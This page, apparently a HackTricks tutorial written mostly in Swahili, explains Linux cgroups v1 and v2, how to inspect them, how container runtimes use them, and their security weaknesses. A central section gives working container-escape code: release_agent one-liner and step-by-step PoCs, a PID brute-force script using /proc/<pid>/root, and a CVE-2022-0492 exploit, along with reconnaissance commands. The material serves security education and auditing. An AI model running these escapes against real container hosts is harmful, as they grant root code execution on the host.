# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux **control groups** ni mekanismo ya kernel inayotumika kuunganisha michakato pamoja kwa ajili ya uhasibu, kuweka mipaka, kupewa kipaumbele, na utekelezaji wa sera. Ikiwa namespaces zinahusu zaidi kutenganisha mtazamo wa rasilimali, cgroups zinahusu zaidi kusimamia **ni kiasi gani** cha rasilimali hizo kundi la michakato linaweza kutumia na, katika baadhi ya kesi, **ni aina gani za rasilimali** ambazo wanaweza kuingiliana nazo kabisa. Containers hutegemea cgroups kila wakati, hata wakati mtumiaji hasioni moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kusema kwa kernel "michakato hizi ni za workload hii, na hizi ndizo kanuni za rasilimali zinazowahusu".

Hii ndiyo sababu engine za container huweka container mpya ndani ya cgroup subtree yake. Mara tu mti wa michakato uko hapo, runtime inaweza kuweka mipaka ya kumbukumbu, kuzuia idadi ya PIDs, kuipa uzito matumizi ya CPU, kusimamia I/O, na kupunguza ufikiaji wa vifaa. Katika mazingira ya uzalishaji, hii ni muhimu kwa usalama wa multi-tenant na kwa usafi wa uendeshaji. Container bila udhibiti madhubuti wa rasilimali inaweza kumaliza kumbukumbu, kujaza mfumo kwa michakato mingi, au kutawala matumizi ya CPU na I/O kwa njia zinazoweza kufanya host au workloads jirani zisistabili.

Kutoka kwa mtazamo wa usalama, cgroups zina umuhimu kwa njia mbili tofauti. Kwanza, mipaka duni au isiyokuwepo ya rasilimali huruhusu mashambulizi ya denial-of-service kwa urahisi. Pili, baadhi ya vipengele vya cgroup, hasa katika usanidi wa zamani wa **cgroup v1**, kihistoria vimeunda powerful breakout primitives pale zilipokuwa zinaweza kuandikwa kutoka ndani ya container.

## v1 Vs v2

Kuna mifano miwili muhimu ya cgroup inayotumika. **cgroup v1** inaonyesha hierarchies nyingi za controller, na exploit writeups za zamani mara nyingi zinazunguka semantics zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zinazopatikana hapo. **cgroup v2** inaleta hierarchy yenye umoja zaidi na tabia safi zaidi kwa ujumla. Distributions za kisasa zinaongezeka kuipa kipaumbele cgroup v2, lakini mazingira mchanganyiko au ya legacy bado yapo, ambayo ina maana kwamba modeli zote mbili bado zinafaa wakati unapoangalia mifumo halisi.

Tofauti hiyo ni muhimu kwa sababu baadhi ya simulizi maarufu za container breakout, kama matumizi mabaya ya **`release_agent`** katika cgroup v1, zinahusishwa sana na tabia za zamani za cgroup. Msomaji ambaye anaona cgroup exploit kwenye blogu kisha bila kuchunguza anaiweka kwenye mfumo wa kisasa wa cgroup v2-only ana uwezekano wa kutoelewa kile kinachoweza kutendeka kwa lengo hilo.

## Ukaguzi

Njia ya haraka kuona wapi shell yako ya sasa iko ni:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Faili `/proc/self/cgroup` inaonyesha njia za cgroup zinazohusishwa na mchakato wa sasa. Katika host ya kisasa ya cgroup v2, mara nyingi utaona kipengele kimoja kilichounganishwa. Kwenye host za zamani au za mseto, unaweza kuona njia nyingi za controller za v1. Ukijua njia, unaweza kuchunguza faili zinazolingana chini ya `/sys/fs/cgroup` ili kuona mipaka na matumizi ya sasa.

Kwenye host ya cgroup v2, amri zifuatazo ni za manufaa:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Faili hizi zinaonyesha ni controllers gani zipo na ni zipi zimepeanwa kwa child cgroups. Mfumo huu wa ugawaji una umuhimu katika mazingira ya rootless na yaliyosimamiwa na systemd, ambapo runtime inaweza kuwa na uwezo wa kudhibiti tu sehemu ndogo ya utendaji wa cgroups ambayo hierarki ya mzazi kwa kweli imepeana.

## Maabara

Njia moja ya kuangalia cgroups vitakavyofanya kazi ni kuendesha container iliyo na ukomo wa kumbukumbu:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Unaweza pia kujaribu kontena yenye kikomo cha PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Mifano hii ni muhimu kwa sababu husaidia kuunganisha runtime flag na kiolesura cha faili cha kernel. Runtime haitekelezi sheria kwa uchawi; inaandika mipangilio husika ya cgroup kisha ikiacha kernel ifanye utekelezaji dhidi ya process tree.

## Matumizi ya Runtime

Docker, Podman, containerd, na CRI-O wote hutegemea cgroups kama sehemu ya operesheni ya kawaida. Tofauti kwa kawaida sio kuhusu kama wanatumia cgroups, bali kuhusu **default gani wanazochagua**, **jinsi wanavyoshirikiana na systemd**, **jinsi rootless delegation inavyofanya kazi**, na **mara ngapi usanidi unadhibitiwa kwenye ngazi ya engine ikilinganishwa na ngazi ya orchestration**.

Katika Kubernetes, resource requests na limits hatimaye zinakuwa cgroup configuration kwenye node. Njia kutoka Pod YAML hadi kernel enforcement inapitia kubelet, CRI runtime, na OCI runtime, lakini cgroups bado ni mekanisma ya kernel inayotekeleza sheria mwisho. Katika mazingira ya Incus/LXC, cgroups pia zinatumiwa sana, hasa kwa sababu system containers mara nyingi huonyesha process tree yenye rasilimali zaidi na matarajio ya uendeshaji yanayofanana na VM.

## Usanidi Mbaya na Kutoroka

Hadithi ya kawaida ya usalama ya cgroup ni mekanismo inayoandikwa **cgroup v1 `release_agent`**. Katika mfano huo, kama mshambuliaji angeweza kuandika kwenye faili sahihi za cgroup, kuwezesha `notify_on_release`, na kudhibiti path iliyohifadhiwa katika `release_agent`, kernel ingeweza kumaliza kwa kutekeleza path iliyochaguliwa na mshambuliaji katika initial namespaces kwenye host wakati cgroup ilipopata kuwa tupu. Hii ndiyo sababu maelezo ya zamani yalikuwa yakizingatia sana uwezo wa kuandika kwenye controller ya cgroup, chaguo za mount, na vigezo vya namespace/capability.

Hata wakati `release_agent` haipo, makosa ya cgroup bado yana umuhimu. Upatikanaji mpana wa vifaa unaweza kufanya vifaa vya host kupatikana kutoka container. Kukosa limits za memory na PID kunaweza kugeuza utekelezaji wa msimbo rahisi kuwa DoS kwa host. Delegation dhaifu ya cgroup katika mazingira ya rootless pia inaweza kudanganya walinzi wakidhani kuna marufuku wakati runtime haikuwa kabisa na uwezo wa kuiweka.

### `release_agent` Historia

Mbinu ya `release_agent` inatumika tu kwa **cgroup v1**. Wazo msingi ni kwamba wakati mchakato wa mwisho katika cgroup anatoa exit na `notify_on_release=1` imewekwa, kernel inatekeleza programu yenye path iliyohifadhiwa katika `release_agent`. Utekelezaji huo hufanyika katika **initial namespaces on the host**, ambayo ndiyo inafanya `release_agent` inayoweza kuandikwa kuwa primitive ya kutoroka kutoka container.

Ili mbinu ifanye kazi, mshambuliaji kwa kawaida anahitaji:

- hierarki inayoweza kuandikwa ya **cgroup v1**
- uwezo wa kuunda au kutumia child cgroup
- uwezo wa kuweka `notify_on_release`
- uwezo wa kuandika path ndani ya `release_agent`
- path inayotatua kuwa executable kutoka upande wa host

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
PoC hii inaandika path ya payload ndani ya `release_agent`, inachochea uachili wa cgroup, kisha inasoma tena faili ya output iliyotengenezwa kwenye host.

### Mwongozo Rahisi wa Kusomeka

Wazo lile linaeleweka kwa urahisi zaidi linapogawanywa katika hatua.

1. Tengeneza na uandae cgroup inayoweza kuandikwa:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Tambua njia ya mwenyeji inayolingana na mfumo wa faili wa kontena:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Weka payload ambayo itaonekana kutoka host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Chochea utekelezaji kwa kufanya cgroup iwe tupu:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.

### Relative Path Variant Using `/proc/<pid>/root`

Kwenye mazingira fulani, host path kwa filesystem ya container si wazi au imefichwa na storage driver. Katika kesi hiyo, payload path inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni host PID inayomilikiwa na mchakato ndani ya container ya sasa. Hii ndiyo msingi wa relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Mbinu muhimu hapa si brute force yenyewe bali fomu ya njia: `/proc/<pid>/root/...` inamwezesha kernel kutatua faili ndani ya filesystem ya container kutoka kwenye host namespace, hata wakati njia ya uhifadhi ya host haijulikani kabla.

### CVE-2022-0492 Tofauti

Mnamo 2022, CVE-2022-0492 ilionyesha kwamba kuandika kwenye `release_agent` katika cgroup v1 hakukagua kwa usahihi uwepo wa `CAP_SYS_ADMIN` katika **awali** user namespace. Hii ilifanya mbinu hiyo iwe rahisi kufikiwa kwenye kernels zilizo na udhaifu, kwa sababu mchakato ndani ya container ulioweza ku-mount hierarchy ya cgroup ungeweza kuandika `release_agent` bila kuwa tayari na ruhusa kwenye host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Kwenye kernel dhaifu, host huendesha `/proc/self/exe` kwa ruhusa za root za host.

Kwa matumizi ya vitendo, anza kwa kuangalia kama mazingira bado yanaonyesha njia za cgroup-v1 zinazoweza kuandikwa au upatikanaji wa vifaa hatarishi:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ikiwa `release_agent` ipo na inaweza kuandikwa, tayari uko katika eneo la legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ikiwa njia ya cgroup yenyewe haitoi kutoroka, matumizi yafuatayo ya vitendo mara nyingi ni denial of service au reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Amri hizi zinakuambia kwa haraka ikiwa workload ina nafasi ya kufanya fork-bomb, kutumia kumbukumbu kwa nguvu, au kutumia vibaya kiolesura cha cgroup cha urithi kinachoweza kuandikwa.

## Ukaguzi

Unapotathmini lengo, kusudio la ukaguzi wa cgroup ni kujifunza ni modeli gani ya cgroup inatumiwa, ikiwa container inaona njia za controller zinazoweza kuandikwa, na ikiwa primitive za zamani za breakout kama `release_agent` zina umuhimu.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi | Containers zinapangwa kwenye cgroups kiotomatiki; mipaka ya rasilimali ni hiari isipokuwa imewekwa kwa flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Imewezeshwa kwa chaguo-msingi | `--cgroups=enabled` ndiyo chaguo-msingi; cgroup namespace chaguo-msingi hutofautiana kwa toleo la cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Imewezeshwa kupitia runtime kwa chaguo-msingi | Pods na containers zimesambazwa kwenye cgroups na node runtime; udhibiti wa rasilimali wa kina hutegemea `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Imewezeshwa kwa chaguo-msingi | cgroups ni sehemu ya usimamizi wa lifecycle wa kawaida | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
